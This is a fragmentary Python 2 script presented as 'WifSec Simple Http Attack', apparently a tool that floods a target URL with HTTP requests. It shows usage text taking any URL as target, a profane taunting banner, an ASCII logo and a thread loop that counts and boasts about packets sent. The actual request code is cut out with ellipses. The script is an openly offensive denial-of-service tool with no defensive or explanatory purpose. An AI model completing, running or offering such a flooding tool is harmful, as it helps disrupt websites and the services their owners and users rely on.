...
def usage():
    print 'WifSec Simple Http Attack'
    print ''
    print 'Usage : WifSec.py (url)'
    print 'Example : WifSec.py http://www.google.com/'
    print 'Have fun fucking elite'
    print 'Expect your connection to slow down; This tool is powerful'
    print "\a"
print \
"""

   Yb        dP     88   888888    .dP"Y8    888888        dP""b8 
  Yb   db   dP    88   88__       `Ybo."       88__          dP   `" 
   YbdPYbdP    88   88""           o.`Y8b   88""           Yb      
      YP  YP        88   88        8bodP'        888888       YboodP 
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "[+] Successfully sent %d packets - WifSec Here Lol" % (request_counter)
				previous=request_counter
		if flag==2:
